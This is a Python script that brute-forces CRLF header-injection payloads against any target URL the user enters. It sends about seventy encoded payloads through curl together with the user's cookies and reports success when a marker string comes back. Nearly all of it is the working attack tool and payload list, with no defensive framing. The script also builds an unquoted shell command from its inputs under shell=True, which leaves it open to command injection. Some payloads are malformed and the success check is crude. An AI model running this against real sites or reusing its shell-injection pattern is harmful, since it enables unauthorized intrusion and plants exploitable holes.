import subprocess

def send_request(url, cookies):
    # Construct the curl command to send a GET request with the URL containing the payload and cookies
    curl_command = f"curl -i -H 'Cookie: {cookies}' {url}"
    # Execute the curl command and capture the output
    result = subprocess.run(curl_command, shell=True, capture_output=True, text=True)
    return result.stdout

def check_for_injection(response):
    # Check if the injected string is present in the response body
    if "InjectedString" in response:
        print("CRLF Injection Successful! 'InjectedString' found in response.")
    else:
        print("CRLF Injection Not Detected.")

def brute_force_crlf(target_url, cookies):
    # Payloads to test
    payloads = [
        "%0D%0AInjectedString",
        "%0AInjectedString",
        "%0DInjectedString",
        "%0D%0A%20InjectedString",
        "%0D%20InjectedString",
        "%20%0DInjectedString",
        "%20%0AInjectedString",
        "%23%OAInjectedString",
        "%23%0AInjectedString",
        "%E5%98%8A%E5%98%8DInjectedString",
        "%E5%98%8A%E5%98%8D%0AInjectedString",
        "%3F%0AInjectedString",
        "crlf%0AInjectedString",
        "crlf%0DInjectedString",
        "crlf%0A%20InjectedString",
        "crlf%0D%20InjectedString",
        "crlf%20%0AInjectedString",
        "crlf%20%0DInjectedString",
        "crlf%23%OAInjectedString",
        "crlf%23%0AInjectedString",
        "crlf%E5%98%8A%E5%98%8DInjectedString",
        "crlf%E5%98%8A%E5%98%8D%0AInjectedString",
        "crlf%3F%0AInjectedString",
        "%0DInjectedString",
        "%0D%20InjectedString",
        "%20%0DInjectedString",
        "%23%0DInjectedString",
        "%23%0AInjectedString",
        "%E5%98%8A%E5%98%8DInjectedString",
        "%E5%98%8A%E5%98%8D%0DInjectedString",
        "%3F%0DInjectedString",
        "crlf%0DInjectedString",
        "crlf%0D%20InjectedString",
        "crlf%20%0DInjectedString",
        "crlf%23%0DInjectedString",
        "crlf%23%0AInjectedString",
        "crlf%E5%98%8A%E5%98%8DInjectedString",
        "crlf%E5%98%8A%E5%98%8D%0DInjectedString",
        "crlf%3F%0DInjectedString",
        "%0D%0AInjectedString",
        "%0D%0A%20InjectedString",
        "%20%0D%0AInjectedString",
        "%23%0D%0AInjectedString",
        "\r\nInjectedString",
        " \r\n InjectedString",
        "\r\n InjectedString",
        "%5cr%5cnInjectedString",
        "%E5%98%8A%E5%98%8DInjectedString",
        "%E5%98%8A%E5%98%8D%0D%0AInjectedString",
        "%3F%0D%0AInjectedString",
        "crlf%0D%0AInjectedString",
        "crlf%0D%0A%20InjectedString",
        "crlf%20%0D%0AInjectedString",
        "crlf%23%0D%0AInjectedString",
        "crlf\r\nInjectedString",
        "crlf%5cr%5cnInjectedString",
        "crlf%E5%98%8A%E5%98%8DInjectedString",
        "crlf%E5%98%8A%E5%98%8D%0DInjectedString",
        "crlf%3F%0D0AInjectedString",
        "%0D%0A%09InjectedString",
        "crlf%0D%0A%09InjectedString",
        "%250AInjectedString",
        "%25250AInjectedString",
        "%%0A0AInjectedString",
        "%25%30AInjectedString",
        "%25%30%61InjectedString",
        "%u000AInjectedString",
        "//www.google.com/%2F%2E%2E%0D%0AInjectedString",
        "/www.google.com/%2E%2E%2F%0D%0AInjectedString",
        "/google.com/%2F..%0D%0AInjectedString"
    ]

    for payload in payloads:
        # Construct the URL by appending the payload
        url_with_payload = target_url + payload
        print(f"Testing URL: {url_with_payload}")
        response = send_request(url_with_payload, cookies)
        check_for_injection(response)

if __name__ == "__main__":
    target_url = input("Enter the target URL: ")
    cookies = input("Enter the cookies (if any): ")
    brute_force_crlf(target_url, cookies)
